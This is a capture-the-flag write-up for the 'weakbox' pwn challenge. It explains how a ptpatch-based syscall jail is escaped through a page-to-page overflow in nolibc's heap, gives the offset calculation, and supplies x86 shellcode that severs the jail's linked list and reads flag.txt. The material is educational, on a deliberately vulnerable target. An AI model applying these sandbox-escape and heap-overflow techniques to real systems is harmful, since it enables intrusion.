# weakbox

Jail Escaping, nolibc Heap Overflow

## checksec

This is the checksec of the tracer

```bash
[*] '/mnt/d/CTFs/acmcyber/winter_2024/pwn/weakbox/weakbox'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x13370000)
    Stack:    Executable
    RWX:      Has RWX segments
```

Lots of vulns :0

However, you can only write and execute shellcode in the tracees which are placed in a syscall jail. In this case, we might think of pwning the tracer from the tracee, but it is indeed much simpler to just (get one tracee to) escape the syscall jail (not that I know how to pwn the tracer from the tracee). 

> More details about what's going on with tracer/tracee directly below

## General Functionality / Structure of the Binary

This challenge is written by [Enzo](https://github.com/enzosaracen/) and based off his [ptpatch](https://github.com/enzosaracen/ptpatch) tool. 

Feel free to read the README of ptpatch, but the gist is that you can patch a binary with a .ptp file (i.e. [weakbox.ptp](./weakbox.ptp) for this chall, the patching is shown in the [Makefile](./Makefile)) to intercept and hook syscalls of that binary. 

This is implemented by embedding the original binary (now called a tracee) within a wrapper binary (called the tracer). The tracer will fork off the tracee such that both programs now share separate vaddr spaces, and runs the various hooks when the tracee makes certain syscalls. 

The binary provided (and that runs on remote), then, is the tracer in which the binary compiled from [weakbox.c](./weakbox.c)is embedded. It can be found [here](./weakbox). 

### Functionality of the Main Tracee

The main functionality of the main tracee is that we can create, read from, and write to "boxes" which are basically just child process forked from the main tracee. 

Shown below is the output of the binary before any input is accepted

```
 ___  ___  ___  ___
_|W|__|E|__|A|__|K|_
 ‾‾‾  ‾‾‾  ‾‾‾  ‾‾‾
  (1) add box
  (2) write to box
  (3) read from box
  (4) exit
   ___  ___  ___
___|B|__|O|__|X|____
   ‾‾‾  ‾‾‾  ‾‾‾
choice:
```

Importantly, as shown in the `add_box` function (specifically the parts relating to the `shc` variable), we can run any shellcode we wish in the child tracees

```c
void add_box()
{
	if (box_cnt >= MAX_BOX) {
		puts("too many boxes");
		return;
	}
	printf("send shellcode (max 0x1000 bytes): ");
	char *shc = mmap(0, 0x1000, 7, MAP_ANON|MAP_PRIVATE, -1, 0);
	memset(shc, 0x90, 0x1000);
	shc[0xfff] = 0xc3;
	read(0, shc, 0x1000);
	pipe(boxes[box_cnt].in);
	pipe(boxes[box_cnt].out);
	boxes[box_cnt].pid = fork();
	if (!boxes[box_cnt].pid) {
		close(2);
		dup2(boxes[box_cnt].in[0], 0);
		dup2(boxes[box_cnt].out[1], 1);
		close(boxes[box_cnt].in[1]);
		close(boxes[box_cnt].out[0]);
		syscall(690);
		((void (*)())shc)();
	loop:
		goto loop;
	}
	close(boxes[box_cnt].in[0]);
	close(boxes[box_cnt].out[1]);
	printf("successfully added box at idx: %d\n", box_cnt);
	box_cnt++;
}
```

Zooming in closer, we see that if the child process is forked successfully,
1. the pipes to the process are set up accordingly, 
2. a syscall 690 is made, 
3. the shellcode we provide is executed, before
4. the child tracee goes into an infinite loop where it does nothing. 

<br>

```c
    if (!boxes[box_cnt].pid) {
		close(2);
		dup2(boxes[box_cnt].in[0], 0);
		dup2(boxes[box_cnt].out[1], 1);
		close(boxes[box_cnt].in[1]);
		close(boxes[box_cnt].out[0]);
		syscall(690);
		((void (*)())shc)();
	loop:
		goto loop;
	}
```

You can read the source code if you like, but `read_box` and `write_box` just read to and write from a child tracee's stdin and stdout respectively, identifying the child tracee by its id (0-indexed). 

### What does syscall 690 do?

Recall that one of the uses of Enzo's ptpatch is to hook syscalls. Well, looking at [weakbox.ptp](./weakbox.ptp), we see that this syscall is hooked

```c
<@ pre-syscall 690
	struct locked *p = &jail;
	while (p->next)
		p = p->next;
	p->pid = pid;
	p->next = calloc(1, sizeof(struct locked));
	if (!p->next)
		exit_now = 1;
@>
```

The `locked` struct is defined as

```c
struct locked {
	int pid;
	struct locked *next;
	char buf[0x100];
} jail;
```

so what is occurring is that whenever a box is added (and does the syscall 690), the tracer adds it to the `jail` linked list, preemptively `calloc`-ing a new chunk on the tracer. We will see why is it called `jail` in a bit. 

Importantly, for emphasis, this code **runs on the tracer**. 

### Syscall Jail

All our boxes lie within the `jail` linked list, and it is a jail because of the following pre-syscall hook in [weakbox.ptp](./weakbox.ptp)

```c
<@ default pre-syscall
	struct locked *p = &jail;
	while (p->next) {
		if (p->pid == pid)
			goto prisoner;
		p = p->next;
	}
	return;
prisoner:
	regs.orig_rax = 0x69420;
@>
```

Basically, whenever any of the child tracees attempts a syscall (other than the `write` syscall since there is a nondefault hook for that), the tracer will go through all the boxes in the syscall jail and set their rax value to 0x69420.

There is no syscall with such a large number, so the jail effectively disables syscalls. As a side note, generally, the process isn't going to trap or abort because we attempt a syscall with a nonexistent syscall number - it may return some error code such as `-ENOSYS`, but execution will typically continue. 

It is because of this that we can't just use an `execve` syscall to spawn a shell within a child tracee and get the flag. 

## Where's the Overflow?

We finally get to the pre-write hook on child tracees (it is basically a write hook since it doesn't actually allow the child tracee to perform the write by setting rax to 0x69420), shown below

```c
<@ pre-syscall write
	if (!parent || pid == parent)
		return;
	regs.orig_rax = 0x69420;
	if (regs.rdx >= 0x100)
		return;
	struct locked *p = &jail;
	int pos = 0;
	while (p->next) {
		if (p->pid == pid) {
			mem_read(regs.rsi, p->buf+pos, regs.rdx);
			pos += regs.rdx;
		}
		p = p->next;
	}
@>
```

The basic functionality is that instead of writing to its stdout (or any other fd for that matter), the child tracee will have the contents it wants to write written into the `buf` section of its `locked` struct. 

Notice that there is not really a need for the `pos` variable to do this, and that it is thus the anomaly. This is especially the case if there is only **one** element in `jail` that represents a particular child tracee with a particular pid. 

But is it possible to have multiple elements in the `jail` linked list that have the same pid such that `pos` gets incremented to a value more than 0? The answer is yes, and the way to do it is to perform syscalls with syscall number 690 in the shellcode we provide. 

This means that we can overflow the `locked` struct eventually, but what can we do with the overflow?

###  nolibc Heap Implementation

At this point we need to mention that ptpatch uses [nolibc](https://lwn.net/Articles/920158/), which is a minimal C-library replacement. 

Also, its implementation of `calloc` (which just calls `malloc`) only involves mmap-ing entire pages (the source code below was taken from [this link](https://kernel.googlesource.com/pub/scm/linux/kernel/git/maz/arm-platforms/+/refs/tags/irqchip-6.6/tools/include/nolibc/stdlib.h))

```c
static __attribute__((unused))
void *malloc(size_t len)
{
	struct nolibc_heap *heap;
	/* Always allocate memory with size multiple of 4096. */
	len  = sizeof(*heap) + len;
	len  = (len + 4095UL) & -4096UL;
	heap = mmap(NULL, len, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE,
		    -1, 0);
	if (__builtin_expect(heap == MAP_FAILED, 0))
		return NULL;
	heap->len = len;
	return heap->user_p;
}
static __attribute__((unused))
void *calloc(size_t size, size_t nmemb)
{
	size_t x = size * nmemb;
	if (__builtin_expect(size && ((x / size) != nmemb), 0)) {
		SET_ERRNO(ENOMEM);
		return NULL;
	}
	/*
	 * No need to zero the heap, the MAP_ANONYMOUS in malloc()
	 * already does it.
	 */
	return malloc(x);
}
```

Since we clearly don't need more than one page to store a single `locked` struct, the tracer mmaps, in its vaddr space, one page per syscall 690 done. 

### nolibc Heap Overflow

When the mmap calls are made, the segments are allocated to the left of the last (i.e. to lower addresses). For the record, I did not know this before trying it out in gdb. 

Anyways, this means that if we overflow the page that is allocated for one `locked` struct, we can write into the page allocated (just before this one) for use by another `locked` struct. 

What do we want to overwrite, though? Well, recall that our goal is to escape the [syscall jail](#syscall-jail) described earlier, and this is enforced by way of a linked list. Well, if the linked list looks as such (where left represents lower addresses)

```
[box1] <- [box0_16] <- [box0_15] <- ... [box0_2] <- [box0_1_global]
```

then by overwriting the `next` field in `box0_16` by using an overflow on `box0_17` to a null pointer, we can sever the linked list

```
[box1] <- [box0_17]    XX broken XX    [box0_16] <- ... [box0_2] <- [box0_1_global]
```

such that shellcode we provided that is running in `box1` will be able to make syscalls. 

#### Offset for the Heap Overflow

Based on the patch, our write starts from 

```
p->buf + pos = p + 0x10 + pos
```

and each time we write, the no. of bytes written is the amount added to `pos`. Since we want to overwrite the `p->next` field of the struct of the next page, we need to overwrite

```
(p + 0x1000)->next = p + 0x1008
```

Since, when we do one write in the child tracee's shellcode which results in many writes in the tracer of the same size, our `pos` can be increased many times, but by the same amount each time. 

Now notice that

```
0x10 + 0xff * 0x10 = 0x1000
```

where 0xff is exactly the maximum number of bytes writable as specified in the pre-write hook. And when we write to `p->buf + pos`, we will write 0xff bytes, thus covering from 0x1000 to 0x10ff which covers the region we desire. 

Thus, offset wise, within for shellcode box0, we need to 

1. make 16 syscall 690's (we end up needing a total of 17, but the first is done within the `add_box` function), 
2. performing a `write` syscall with the null pointer occurring at offset 8 (since 0x1008 = 0x1000 + 8) of the content to be written, and the write size 0xff. 

This will be easier to understand if you breakpoint the tracer binary at 0x0x13370ac4 (the pre-write hook) and 0x13371028 (the pre-sycall 690 hook) before stepping through what occurs to the binary when run using the solve script in gef. 

## The Exploit

The central idea of the exploit is that 
1. we will have one box that performs the [nolibc heap overflow](#nolibc-heap-overflow) to cut the other box off the `jail` linked list, and 
2. another box that keeps looping and trying to read the flag using syscalls. 

### Box 0 

Box 0 runs a number of syscall 690's to populate the `jail` linked list, runs a do-nothing loop a large number of times to wait for [Box 1](#box-1) to start, before performing a `write` syscall to heap overflow so that 

The shellcode for it is

```x86asm
mov rax, 690
syscall
mov rax, 690
syscall
...
mov rax, 690
syscall

mov rcx, 10000000000
loop: dec rcx
jnz loop

mov eax, 1
lea rsi, [rip + 9]
mov rdx, 0xff
syscall
```

We use the `lea rsi, [rip + 9]` instr before the `write` syscall because the payload to be written (described briefly within [here](#offset-for-the-heap-overflow)) occurs immediately after the syscall opcodes. 

### Box 1

Box 1 loops continuously attempting to make 2 syscalls

1. open `flag.txt`, which returns a fd for the flag file, and
2. sendfile, which sends data from one fd (from the open syscall) to another (stdout)

The Python code involved in constructing it is shown below

```python
shc = f'''
    start: 
    {shellcraft.open('flag.txt', 0, 0)}
    mov r10d, 0x1010201
    xor r10d, 0x1010301
    push 1
    pop rdi
    xor edx, edx
    mov rsi, rax
    push SYS_sendfile
    pop rax
    syscall
    jmp start
    '''
```

For the `sendfile` syscall, I just took the assembly code for `shellcraft.sendfile(1, 1, 0, 0x100)` and modified `mov rsi, rdi` to `mov rsi, rax`. 

## Flag 

Feel free to run the [solve script](./solve.py) (no guarantees that the infra is still up)